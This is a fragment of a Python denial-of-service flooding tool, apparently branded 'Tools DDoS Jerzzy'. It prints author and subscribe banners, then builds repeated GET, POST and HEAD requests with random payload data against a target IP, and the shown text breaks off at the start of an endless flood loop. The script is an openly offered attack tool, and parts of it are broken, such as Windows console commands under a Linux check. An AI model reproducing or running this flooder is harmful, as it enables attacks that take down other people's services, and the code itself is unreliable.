...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Jerzzy [ DDoS Attack ]")
print("=======================================================================================")
print("[ × ]  Jerzzy[ × ]")
print("[ + ]  ByJerzzy")
print("[ + ] DONT FORGET SUBSCRIBE Jerzzy")
print("=======================================================================================")
print("[ + ] Author: LeoKaze17")
print("[ + ] Update Tool: LeoKaze17")
print("==========================")
...
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By Jerzzy [ DDoS Attack ]")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(20179)
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_JerzzyNOTWRONG_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_JerzzyNOTWRONG_Will_NoSurrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
